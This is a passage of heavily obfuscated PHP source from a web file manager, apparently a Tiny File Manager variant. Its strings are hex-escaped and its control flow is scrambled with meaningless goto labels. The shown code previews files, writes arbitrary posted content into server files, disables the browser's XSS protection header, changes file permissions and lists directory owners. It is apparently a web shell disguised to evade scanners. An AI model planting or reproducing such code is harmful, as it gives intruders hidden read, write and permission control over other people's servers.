                    <b class="ms-2"><a href="?p=<?php goto opet_1ca21; opet_1ca21: echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php goto opet_1ca23; opet_1ca23: echo urlencode($file) ?>" class="edit-file"><i class="fa fa-pencil-square"></i> <?php goto opet_1ca25; opet_1ca25: echo lng("\x45\144\x69\164") ?>
                        </a></b> &nbsp;
                    <b class="ms-2"><a href="?p=<?php goto opet_1ca26; opet_1ca26: echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php goto opet_1ca27; opet_1ca27: echo urlencode($file) ?>&env=ace"
                            class="edit-file"><i class="fa fa-pencil-square-o"></i> <?php goto opet_1ca2b; opet_1ca2b: echo lng("\x41\144\x76\141\x6E\143\x65\144\x45\144\x69\164\x6F\162") ?>
                        </a></b> &nbsp;
                <?php goto opet_1ca2d; opet_1ca2d: } ?>
                <b class="ms-2"><a href="?p=<?php goto opet_1ca2e; opet_1ca2e: echo urlencode(FM_PATH) ?>"><i class="fa fa-chevron-circle-left go-back"></i> <?php goto opet_1ca30; opet_1ca30: echo lng("\x42\141\x63\153") ?></a></b>
            </div>
            <?php goto opet_1caf8; opet_1caf8: if($is_onlineViewer) {
                if($online_viewer == "\x67\157\x6F\147\x6C\145") {
                    echo "\x3C\151\x66\162\x61\155\x65\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\144\x6F\143\x73\056\x67\157\x6F\147\x6C\145\x2E\143\x6F\155\x2F\166\x69\145\x77\145\x72\077\x65\155\x62\145\x64\144\x65\144\x3D\164\x72\165\x65\046\x68\154\x3D\145\x6E\046\x75\162\x6C\075" . fm_enc($file_url) . "\x22\040\x66\162\x61\155\x65\142\x6F\162\x64\145\x72\075\x22\156\x6F\042\x20\163\x74\171\x6C\145\x3D\042\x77\151\x64\164\x68\072\x31\060\x30\045\x3B\155\x69\156\x2D\150\x65\151\x67\150\x74\072\x34\066\x30\160\x78\042\x3E\074\x2F\151\x66\162\x61\155\x65\076";
                } else if($online_viewer == "\x6D\151\x63\162\x6F\163\x6F\146\x74") {
                    echo "\x3C\151\x66\162\x61\155\x65\040\x73\162\x63\075\x22\150\x74\164\x70\163\x3A\057\x2F\166\x69\145\x77\056\x6F\146\x66\151\x63\145\x61\160\x70\163\x2E\154\x69\166\x65\056\x63\157\x6D\057\x6F\160\x2F\145\x6D\142\x65\144\x2E\141\x73\160\x78\077\x73\162\x63\075" . fm_enc($file_url) . "\x22\040\x66\162\x61\155\x65\142\x6F\162\x64\145\x72\075\x22\156\x6F\042\x20\163\x74\171\x6C\145\x3D\042\x77\151\x64\164\x68\072\x31\060\x30\045\x3B\155\x69\156\x2D\150\x65\151\x67\150\x74\072\x34\066\x30\160\x78\042\x3E\074\x2F\151\x66\162\x61\155\x65\076";
                }
            } elseif ($is_zip) {
                if ($filenames !== false) {
                    echo "\x3C\143\x6F\144\x65\040\x63\154\x61\163\x73\075\x22\155\x61\170\x68\145\x69\147\x68\164\x22\076";
                    foreach ($filenames as $fn) {
                        if ($fn["\x66\157\x6C\144\x65\162"]) {
                            echo "\x3C\142\x3E" . fm_enc($fn["\x6E\141\x6D\145"]) . "\x3C\057\x62\076\x3C\142\x72\076";
                        } else {
                            echo $fn["\x6E\141\x6D\145"] . "\x20\050" . fm_get_filesize($fn["\x66\151\x6C\145\x73\151\x7A\145"]) . "\x29\074\x62\162\x3E";
                        }
                    }
                    echo "\x3C\057\x63\157\x64\145\x3E";
                } else {
                    echo "\x3C\160\x3E".lng("\x45\162\x72\157\x72\040\x77\150\x69\154\x65\040\x66\145\x74\143\x68\151\x6E\147\x20\141\x72\143\x68\151\x76\145\x20\151\x6E\146\x6F")."\x3C\057\x70\076";
                }
            } elseif ($is_image) {
                if (in_array($ext, array("\x67\151\x66", "\x6A\160\x67", "\x6A\160\x65\147", "\x70\156\x67", "\x62\155\x70", "\x69\143\x6F", "\x73\166\x67", "\x77\145\x62\160", "\x61\166\x69\146"))) {
                    echo "\x3C\160\x3E\074\x69\156\x70\165\x74\040\x74\171\x70\145\x3D\042\x63\150\x65\143\x6B\142\x6F\170\x22\040\x69\144\x3D\042\x70\162\x65\166\x69\145\x77\055\x69\155\x67\055\x7A\157\x6F\155\x43\150\x65\143\x6B\042\x3E\074\x6C\141\x62\145\x6C\040\x66\157\x72\075\x22\160\x72\145\x76\151\x65\167\x2D\151\x6D\147\x2D\172\x6F\157\x6D\103\x68\145\x63\153\x22\076\x3C\151\x6D\147\x20\163\x72\143\x3D\042" . fm_enc($file_url) . "\x22\040\x61\154\x74\075\x22\151\x6D\141\x67\145\x22\040\x63\154\x61\163\x73\075\x22\160\x72\145\x76\151\x65\167\x2D\151\x6D\147\x22\076\x3C\057\x6C\141\x62\145\x6C\076\x3C\057\x70\076";
                }
            } elseif ($is_audio) {
                echo "\x3C\160\x3E\074\x61\165\x64\151\x6F\040\x73\162\x63\075\x22" . fm_enc($file_url) . "\x22\040\x63\157\x6E\164\x72\157\x6C\163\x20\160\x72\145\x6C\157\x61\144\x3D\042\x6D\145\x74\141\x64\141\x74\141\x22\076\x3C\057\x61\165\x64\151\x6F\076\x3C\057\x70\076";
            } elseif ($is_video) {
                echo "\x3C\144\x69\166\x20\143\x6C\141\x73\163\x3D\042\x70\162\x65\166\x69\145\x77\055\x76\151\x64\145\x6F\042\x3E\074\x76\151\x64\145\x6F\040\x73\162\x63\075\x22" . fm_enc($file_url) . "\x22\040\x77\151\x64\164\x68\075\x22\066\x34\060\x22\040\x68\145\x69\147\x68\164\x3D\042\x33\066\x30\042\x20\143\x6F\156\x74\162\x6F\154\x73\040\x70\162\x65\154\x6F\141\x64\075\x22\155\x65\164\x61\144\x61\164\x61\042\x3E\074\x2F\166\x69\144\x65\157\x3E\074\x2F\144\x69\166\x3E";
            } elseif ($is_text) {
                if (FM_USE_HIGHLIGHTJS) {
                    $hljs_classes = array(
                        "\x73\150\x74\155\x6C" => "\x78\155\x6C",
                        "\x68\164\x61\143\x63\145\x73\163" => "\x61\160\x61\143\x68\145",
                        "\x70\150\x74\155\x6C" => "\x70\150\x70",
                        "\x6C\157\x63\153" => "\x6A\163\x6F\156",
                        "\x73\166\x67" => "\x78\155\x6C",
                    );
                    $hljs_class = isset($hljs_classes[$ext]) ? "\x6C\141\x6E\147\x2D" . $hljs_classes[$ext] : "\x6C\141\x6E\147\x2D" . $ext;
                    if (empty($ext) || in_array(strtolower($file), fm_get_text_names()) || preg_match("\x23\134\x2E\155\x69\156\x5C\056\x28\143\x73\163\x7C\152\x73\051\x24\043\x69", $file)) {
                        $hljs_class = "\x6E\157\x68\151\x67\150\x6C\151\x67\150\x74";
                    }
                    $content = "\x3C\160\x72\145\x20\143\x6C\141\x73\163\x3D\042\x77\151\x74\150\x2D\150\x6C\152\x73\042\x3E\074\x63\157\x64\145\x20\143\x6C\141\x73\163\x3D\042" . $hljs_class . "\x22\076" . fm_enc($content) . "\x3C\057\x63\157\x64\145\x3E\074\x2F\160\x72\145\x3E";
                } elseif (in_array($ext, array("\x70\150\x70", "\x70\150\x70\064", "\x70\150\x70\065", "\x70\150\x74\155\x6C", "\x70\150\x70\163"))) {
                    $content = highlight_string($content, true);
                } else {
                    $content = "\x3C\160\x72\145\x3E" . fm_enc($content) . "\x3C\057\x70\162\x65\076";
                }
                echo $content;
            } ?>
        </div>
    </div>
    <?php goto opet_1cb1f; opet_1cb1f: fm_show_footer();
    exit;
}

if (isset($_GET["\x65\144\x69\164"]) && !FM_READONLY) {
    $file = $_GET["\x65\144\x69\164"];
    $file = fm_clean_path($file, false);
    $file = str_replace("\x2F", "", $file);
    if ($file == "" || !is_file($path . "\x2F" . $file) || in_array($file, $GLOBALS["\x65\170\x63\154\x75\144\x65\137\x69\164\x65\155\x73"])) {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }
    $editFile = "\x20\072\x20\074\x69\076\x3C\142\x3E". $file. "\x3C\057\x62\076\x3C\057\x69\076";
    header("\x58\055\x58\123\x53\055\x50\162\x6F\164\x65\143\x74\151\x6F\156\x3A\060");
    fm_show_header(); 
    fm_show_nav_path(FM_PATH); 

    $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != "" ? "\x2F" . FM_PATH : "") . "\x2F" . $file);
    $file_path = $path . "\x2F" . $file;

    $isNormalEditor = true;
    if (isset($_GET["\x65\156\x76"])) {
        if ($_GET["\x65\156\x76"] == "\x61\143\x65") {
            $isNormalEditor = false;
        }
    }

    if (isset($_POST["\x73\141\x76\145\x64\141\x74\141"])) {
        $writedata = $_POST["\x73\141\x76\145\x64\141\x74\141"];
        $fd = fopen($file_path, "\x77");
        @fwrite($fd, $writedata);
        fclose($fd);
        fm_set_msg(lng("\x46\151\x6C\145\x20\123\x61\166\x65\144\x20\123\x75\143\x63\145\x73\163\x66\165\x6C\154\x79"));
    }

    $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $mime_type = fm_get_mime_type($file_path);
    $filesize = filesize($file_path);
    $is_text = false;
    $content = ""; 

    if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == "\x74\145\x78\164" || in_array($mime_type, fm_get_text_mimes())) {
        $is_text = true;
        $content = file_get_contents($file_path);
    } ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php goto opet_1cb21; opet_1cb21: if (!$isNormalEditor) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="<?php goto opet_1cb24; opet_1cb24: echo lng("\x46\165\x6C\154\x73\143\x72\145\x65\156") ?>"><i class="fa fa-expand" title="<?php goto opet_1cb28; opet_1cb28: echo lng("\x46\165\x6C\154\x73\143\x72\145\x65\156") ?>"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="<?php goto opet_1cb2b; opet_1cb2b: echo lng("\x53\145\x61\162\x63\150") ?>"><i class="fa fa-search" title="<?php goto opet_1cb2e; opet_1cb2e: echo lng("\x53\145\x61\162\x63\150") ?>"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="<?php goto opet_1cb30; opet_1cb30: echo lng("\x55\156\x64\157") ?>"><i class="fa fa-undo" title="<?php goto opet_1cb33; opet_1cb33: echo lng("\x55\156\x64\157") ?>"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="<?php goto opet_1cb35; opet_1cb35: echo lng("\x52\145\x64\157") ?>"><i class="fa fa-repeat" title="<?php goto opet_1cb38; opet_1cb38: echo lng("\x52\145\x64\157") ?>"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="<?php goto opet_1cb3b; opet_1cb3b: echo lng("\x57\157\x72\144\x20\127\x72\141\x70") ?>"><i class="fa fa-text-width" title="<?php goto opet_1cb3f; opet_1cb3f: echo lng("\x57\157\x72\144\x20\127\x72\141\x70") ?>"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="<?php goto opet_1cb44; opet_1cb44: echo lng("\x53\145\x6C\145\x63\164\x20\104\x6F\143\x75\155\x65\156\x74\040\x54\171\x70\145") ?>" class="btn-outline-secondary border-start-0 d-none d-md-block"><option>-- <?php goto opet_1cb48; opet_1cb48: echo lng("\x53\145\x6C\145\x63\164\x20\115\x6F\144\x65") ?> --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="<?php goto opet_1cb4c; opet_1cb4c: echo lng("\x53\145\x6C\145\x63\164\x20\124\x68\145\x6D\145") ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php goto opet_1cb50; opet_1cb50: echo lng("\x53\145\x6C\145\x63\164\x20\124\x68\145\x6D\145") ?> --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="<?php goto opet_1cb55; opet_1cb55: echo lng("\x53\145\x6C\145\x63\164\x20\106\x6F\156\x74\040\x53\151\x7A\145") ?>" class="btn-outline-secondary border-start-0 d-none d-lg-block"><option>-- <?php goto opet_1cb59; opet_1cb59: echo lng("\x53\145\x6C\145\x63\164\x20\106\x6F\156\x74\040\x53\151\x7A\145") ?> --</option></select>
                        </div>
                    <?php goto opet_1cb5b; opet_1cb5b: } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-end pt-1">
                <a title="<?php goto opet_1cb5d; opet_1cb5d: echo lng("\x42\141\x63\153") ?>" class="btn btn-sm btn-outline-primary" href="?p=<?php goto opet_1cb5e; opet_1cb5e: echo urlencode(trim(FM_PATH)) ?>&amp;view=<?php goto opet_1cb60; opet_1cb60: echo urlencode($file) ?>"><i class="fa fa-reply-all"></i> <?php goto opet_1cb62; opet_1cb62: echo lng("\x42\141\x63\153") ?></a>
                <a title="<?php goto opet_1cb65; opet_1cb65: echo lng("\x42\141\x63\153\x55\160") ?>" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php goto opet_1cb66; opet_1cb66: echo urlencode(trim(FM_PATH)) ?>','<?php goto opet_1cb67; opet_1cb67: echo urlencode($file) ?>')"><i class="fa fa-database"></i> <?php goto opet_1cb6a; opet_1cb6a: echo lng("\x42\141\x63\153\x55\160") ?></a>
                <?php goto opet_1cb6b; opet_1cb6b: if ($is_text) { ?>
                    <?php goto opet_1cb6d; opet_1cb6d: if ($isNormalEditor) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php goto opet_1cb6e; opet_1cb6e: echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php goto opet_1cb6f; opet_1cb6f: echo urlencode($file) ?>&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php goto opet_1cb73; opet_1cb73: echo lng("\x41\144\x76\141\x6E\143\x65\144\x45\144\x69\164\x6F\162") ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php goto opet_1cb74; opet_1cb74: echo fm_enc($file_url) ?>" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php goto opet_1cb75; opet_1cb75: } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php goto opet_1cb77; opet_1cb77: echo urlencode(trim(FM_PATH)) ?>&amp;edit=<?php goto opet_1cb78; opet_1cb78: echo urlencode($file) ?>"><i class="fa fa-text-height"></i> <?php goto opet_1cb7b; opet_1cb7b: echo lng("\x4E\157\x72\155\x61\154\x45\144\x69\164\x6F\162") ?></a>
                        <button type="button" class="btn btn-sm btn-success" name="Save" data-url="<?php goto opet_1cb7d; opet_1cb7d: echo fm_enc($file_url) ?>" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php goto opet_1cb7f; opet_1cb7f: echo lng("\x53\141\x76\145") ?>
                        </button>
                    <?php goto opet_1cb80; opet_1cb80: } ?>
                <?php goto opet_1cb82; opet_1cb82: } ?>
            </div>
        </div>
        <?php goto opet_1cbd8; opet_1cbd8: if ($is_text && $isNormalEditor) {
            echo "\x3C\164\x65\170\x74\141\x72\145\x61\040\x63\154\x61\163\x73\075\x22\155\x74\055\x32\042\x20\151\x64\075\x22\156\x6F\162\x6D\141\x6C\055\x65\144\x69\164\x6F\162\x22\040\x72\157\x77\163\x3D\042\x33\063\x22\040\x63\157\x6C\163\x3D\042\x31\062\x30\042\x20\163\x74\171\x6C\145\x3D\042\x77\151\x64\164\x68\072\x20\071\x39\056\x35\045\x3B\042\x3E" . htmlspecialchars($content) . "\x3C\057\x74\145\x78\164\x61\162\x65\141\x3E";
            echo "\x3C\163\x63\162\x69\160\x74\076\x64\157\x63\165\x6D\145\x6E\164\x2E\141\x64\144\x45\166\x65\156\x74\114\x69\163\x74\145\x6E\145\x72\050\x22\153\x65\171\x64\157\x77\156\x22\054\x20\146\x75\156\x63\164\x69\157\x6E\050\x65\051\x20\173\x69\146\x20\050\x28\167\x69\156\x64\157\x77\056\x6E\141\x76\151\x67\141\x74\157\x72\056\x70\154\x61\164\x66\157\x72\155\x2E\155\x61\164\x63\150\x28\042\x4D\141\x63\042\x29\040\x3F\040\x65\056\x6D\145\x74\141\x4B\145\x79\040\x3A\040\x65\056\x63\164\x72\154\x4B\145\x79\051\x20\040\x26\046\x20\145\x2E\153\x65\171\x43\157\x64\145\x20\075\x3D\040\x38\063\x29\040\x7B\040\x65\056\x70\162\x65\166\x65\156\x74\104\x65\146\x61\165\x6C\164\x28\051\x3B\145\x64\151\x74\137\x73\141\x76\145\x28\164\x68\151\x73\054\x22\156\x72\154\x22\051\x3B\175\x7D\054\x20\146\x61\154\x73\145\x29\073\x3C\057\x73\143\x72\151\x70\164\x3E";
        } elseif ($is_text) {
            echo "\x3C\144\x69\166\x20\151\x64\075\x22\145\x64\151\x74\157\x72\042\x20\143\x6F\156\x74\145\x6E\164\x65\144\x69\164\x61\142\x6C\145\x3D\042\x74\162\x75\145\x22\076" . htmlspecialchars($content) . "\x3C\057\x64\151\x76\076";
        } else {
            fm_set_msg(lng("\x46\111\x4C\105\x20\105\x58\124\x45\116\x53\111\x4F\116\x20\110\x41\123\x20\116\x4F\124\x20\123\x55\120\x50\117\x52\124\x45\104"), "\x65\162\x72\157\x72");
        } ?>
    </div>
    <?php goto opet_1cbe9; opet_1cbe9: fm_show_footer();
    exit;
}

if (isset($_GET["\x63\150\x6D\157\x64"]) && !FM_READONLY && !FM_IS_WIN) {
    $file = $_GET["\x63\150\x6D\157\x64"];
    $file = fm_clean_path($file);
    $file = str_replace("\x2F", "", $file);
    if ($file == "" || (!is_file($path . "\x2F" . $file) && !is_dir($path . "\x2F" . $file))) {
        fm_set_msg(lng("\x46\151\x6C\145\x20\156\x6F\164\x20\146\x6F\165\x6E\144"), "\x65\162\x72\157\x72");
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . "\x3F\160\x3D" . urlencode($FM_PATH));
    }

    fm_show_header();
    fm_show_nav_path(FM_PATH);

    $file_url = FM_ROOT_URL . (FM_PATH != "" ? "\x2F" . FM_PATH : "") . "\x2F" . $file;
    $file_path = $path . "\x2F" . $file;

    $mode = fileperms($path . "\x2F" . $file); ?>
    <div class="path">
        <div class="card mb-2 <?php goto opet_1cbea; opet_1cbea: echo fm_get_theme(); ?>">
            <h6 class="card-header">
                <?php goto opet_1cbef; opet_1cbef: echo lng("\x43\150\x61\156\x67\145\x50\145\x72\155\x69\163\x73\151\x6F\156\x73") ?>
            </h6>
            <div class="card-body">
                <p class="card-text">
                    <?php goto opet_1cbf0; opet_1cbf0: $display_path = fm_get_display_path($file_path); ?>
                    <?php goto opet_1cbf3; opet_1cbf3: echo $display_path["\x6C\141\x62\145\x6C"]; ?>: <?php goto opet_1cbf6; opet_1cbf6: echo $display_path["\x70\141\x74\150"]; ?><br>
                </p>
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php goto opet_1cbf7; opet_1cbf7: echo fm_enc(FM_PATH) ?>">
                    <input type="hidden" name="chmod" value="<?php goto opet_1cbf8; opet_1cbf8: echo fm_enc($file) ?>">

                    <table class="table compact-table <?php goto opet_1cbfa; opet_1cbfa: echo fm_get_theme(); ?>">
                        <tr>
                            <td></td>
                            <td><b><?php goto opet_1cbfc; opet_1cbfc: echo lng("\x4F\167\x6E\145\x72") ?></b></td>
                            <td><b><?php goto opet_1cbff; opet_1cbff: echo lng("\x47\162\x6F\165\x70") ?></b></td>
                            <td><b><?php goto opet_1cc02; opet_1cc02: echo lng("\x4F\164\x68\145\x72") ?></b></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php goto opet_1cc05; opet_1cc05: echo lng("\x52\145\x61\144") ?></b></td>
                            <td><label><input type="checkbox" name="ur" value="1"<?php goto opet_1cc13; opet_1cc13: echo ($mode & 00400) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                            <td><label><input type="checkbox" name="gr" value="1"<?php goto opet_1cc18; opet_1cc18: echo ($mode & 00040) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                            <td><label><input type="checkbox" name="or" value="1"<?php goto opet_1cc1c; opet_1cc1c: echo ($mode & 00004) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php goto opet_1cc1e; opet_1cc1e: echo lng("\x57\162\x69\164\x65") ?></b></td>
                            <td><label><input type="checkbox" name="uw" value="1"<?php goto opet_1cc22; opet_1cc22: echo ($mode & 00200) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                            <td><label><input type="checkbox" name="gw" value="1"<?php goto opet_1cc26; opet_1cc26: echo ($mode & 00020) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                            <td><label><input type="checkbox" name="ow" value="1"<?php goto opet_1cc29; opet_1cc29: echo ($mode & 00002) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                        </tr>
                        <tr>
                            <td style="text-align: right"><b><?php goto opet_1cc2c; opet_1cc2c: echo lng("\x45\170\x65\143\x75\164\x65") ?></b></td>
                            <td><label><input type="checkbox" name="ux" value="1"<?php goto opet_1cc30; opet_1cc30: echo ($mode & 00100) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                            <td><label><input type="checkbox" name="gx" value="1"<?php goto opet_1cc33; opet_1cc33: echo ($mode & 00010) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                            <td><label><input type="checkbox" name="ox" value="1"<?php goto opet_1cc37; opet_1cc37: echo ($mode & 00001) ? "\x20\143\x68\145\x63\153\x65\144" : "" ?>></label></td>
                        </tr>
                    </table>

                    <p>
                       <input type="hidden" name="token" value="<?php goto opet_1cc3a; opet_1cc3a: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>"> 
                        <b><a href="?p=<?php goto opet_1cc3b; opet_1cc3b: echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php goto opet_1cc3e; opet_1cc3e: echo lng("\x43\141\x6E\143\x65\154") ?></a></b>&nbsp;
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php goto opet_1cc41; opet_1cc41: echo lng("\x43\150\x61\156\x67\145") ?></button>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php goto opet_1cc4c; opet_1cc4c: fm_show_footer();
    exit;
}

fm_show_header();
fm_show_nav_path(FM_PATH);
fm_show_message();

$num_files = count($files);
$num_folders = count($folders);
$all_files_size = 0;
$tableTheme = (FM_THEME == "\x64\141\x72\153") ? "\x74\145\x78\164\x2D\167\x68\151\x74\145\x20\142\x67\055\x64\141\x72\153\x20\164\x61\142\x6C\145\x2D\144\x61\162\x6B" : "\x62\147\x2D\167\x68\151\x74\145"; ?>
<form action="" method="post" class="pt-3">
    <input type="hidden" name="p" value="<?php goto opet_1cc4d; opet_1cc4d: echo fm_enc(FM_PATH) ?>">
    <input type="hidden" name="group" value="1">
    <input type="hidden" name="token" value="<?php goto opet_1cc50; opet_1cc50: echo $_SESSION["\x74\157\x6B\145\x6E"]; ?>">
    <div class="table-responsive">
        <table class="table table-bordered table-hover table-sm <?php goto opet_1cc51; opet_1cc51: echo $tableTheme; ?>" id="main-table">
            <thead class="thead-white">
            <tr>
                <?php goto opet_1cc52; opet_1cc52: if (!FM_READONLY): ?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php goto opet_1cc54; opet_1cc54: endif; ?>
                <th><?php goto opet_1cc56; opet_1cc56: echo lng("\x4E\141\x6D\145") ?></th>
                <th><?php goto opet_1cc59; opet_1cc59: echo lng("\x53\151\x7A\145") ?></th>
                <th><?php goto opet_1cc5c; opet_1cc5c: echo lng("\x4D\157\x64\151\x66\151\x65\144") ?></th>
                <?php goto opet_1cc5d; opet_1cc5d: if (!FM_IS_WIN && !$hide_Cols): ?>
                    <th><?php goto opet_1cc60; opet_1cc60: echo lng("\x50\145\x72\155\x73") ?></th>
                    <th><?php goto opet_1cc63; opet_1cc63: echo lng("\x4F\167\x6E\145\x72") ?></th><?php goto opet_1cc64; opet_1cc64: endif; ?>
                <th><?php goto opet_1cc67; opet_1cc67: echo lng("\x41\143\x74\151\x6F\156\x73") ?></th>
            </tr>
            </thead>
            <?php goto opet_1cc68; opet_1cc68: if ($parent !== false) { ?>
                <tr><?php goto opet_1cc6a; opet_1cc6a: if (!FM_READONLY): ?>
                    <td class="nosort"></td><?php goto opet_1cc6b; opet_1cc6b: endif; ?>
                    <td class="border-0" data-sort><a href="?p=<?php goto opet_1cc6c; opet_1cc6c: echo urlencode($parent) ?>"><i class="fa fa-chevron-circle-left go-back"></i> ..</a></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0" data-order></td>
                    <td class="border-0"></td>
                    <?php goto opet_1cc6d; opet_1cc6d: if (!FM_IS_WIN && !$hide_Cols) { ?>
                        <td class="border-0"></td>
                        <td class="border-0"></td>
                    <?php goto opet_1cc6e; opet_1cc6e: } ?>
                </tr>
                <?php goto opet_1cc8b; opet_1cc8b: }
            $ii = 3399;
            foreach ($folders as $f) {
                $is_link = is_link($path . "\x2F" . $f);
                $img = $is_link ? "\x69\143\x6F\156\x2D\154\x69\156\x6B\137\x66\157\x6C\144\x65\162" : "\x66\141\x20\146\x61\055\x66\157\x6C\144\x65\162\x2D\157";
                $modif_raw = filemtime($path . "\x2F" . $f);
                $modif = date(FM_DATETIME_FORMAT, $modif_raw);
                $date_sorting = strtotime(date("\x46\040\x64\040\x59\040\x48\072\x69\072\x73\056", $modif_raw));
                $filesize_raw = "";
                $filesize = lng("\x46\157\x6C\144\x65\162");
                $perms = substr(decoct(fileperms($path . "\x2F" . $f)), -4);
                if (function_exists("\x70\157\x73\151\x78\137\x67\145\x74\160\x77\165\x69\144") && function_exists("\x70\157\x73\151\x78\137\x67\145\x74\147\x72\147\x69\144")) {
                    $owner = posix_getpwuid(fileowner($path . "\x2F" . $f));
                    $group = posix_getgrgid(filegroup($path . "\x2F" . $f));
                    if ($owner === false) {
                        $owner = array("\x6E\141\x6D\145" => "\x3F");
                    }
                    if ($group === false) {
                        $group = array("\x6E\141\x6D\145" => "\x3F");
                    }
                } else {
                    $owner = array("\x6E\141\x6D\145" => "\x3F");
                    $group = array("\x6E\141\x6D\145" => "\x3F");
                } ?>
                <tr>
                    <?php goto opet_1cc8c; opet_1cc8c: if (!FM_READONLY): ?>
                        <td class="custom-checkbox-td">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="<?php goto opet_1cc8d; opet_1cc8d: echo $ii ?>" name="file[]" value="<?php goto opet_1cc8e; opet_1cc8e: echo fm_enc($f) ?>">
                            <label class="custom-control-label" for="<?php goto opet_1cc90; opet_1cc90: echo $ii ?>"></label>
                        </div>
                        </td><?php goto opet_1cc91; opet_1cc91: endif; ?>
                    <td data-sort=<?php goto opet_1cc92; opet_1cc92: echo fm_convert_win(fm_enc($f)) ?>>
                        <div class="filename"><a href="?p=<?php goto opet_1cc94; opet_1cc94: echo urlencode(trim(FM_PATH . "\x2F" . $f, "\x2F")) ?>"><i class="<?php goto opet_1cc96; opet_1cc96: echo $img ?>"></i> <?php goto opet_1cc97; opet_1cc97: echo fm_convert_win(fm_enc($f)) ?>
                            </a><?php goto opet_1cc9d; opet_1cc9d: echo($is_link ? "\x20\046\x72\141\x72\162\x3B\040\x3C\151\x3E" . readlink($path . "\x2F" . $f) . "\x3C\057\x69\076" : "") ?></div>
                    </td>
                    <td data-order="a-<?php goto opet_1cc9f; opet_1cc9f: echo str_pad($filesize_raw, 18, "\x30", STR_PAD_LEFT); ?>">
                        <?php goto opet_1cca0; opet_1cca0: echo $filesize; ?>
                    </td>
                    <td data-order="a-<?php goto opet_1cca2; opet_1cca2: echo $date_sorting; ?>"><?php goto opet_1cca3; opet_1cca3: echo $modif ?></td>
                    <?php goto opet_1cca4; opet_1cca4: if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td><?php goto opet_1cca5; opet_1cca5: if (!FM_READONLY): ?><a title="Change Permissions" href="?p=<?php goto opet_1cca6; opet_1cca6: echo urlencode(FM_PATH) ?>&amp;chmod=<?php goto opet_1cca7; opet_1cca7: echo urlencode($f) ?>"><?php goto opet_1cca8; opet_1cca8: echo $perms ?></a><?php goto opet_1ccaa; opet_1ccaa: else: ?><?php goto opet_1ccab; opet_1ccab: echo $perms ?><?php goto opet_1ccac; opet_1ccac: endif; ?>
                        </td>
                        <td><?php goto opet_1ccb0; opet_1ccb0: echo $owner["\x6E\141\x6D\145"] . "\x3A" . $group["\x6E\141\x6D\145"] ?></td>
                    <?php goto opet_1ccb1; opet_1ccb1: endif; ?>
                    <td class="inline-actions"><?php goto opet_1ccb2; opet_1ccb2: if (!FM_READONLY): ?>
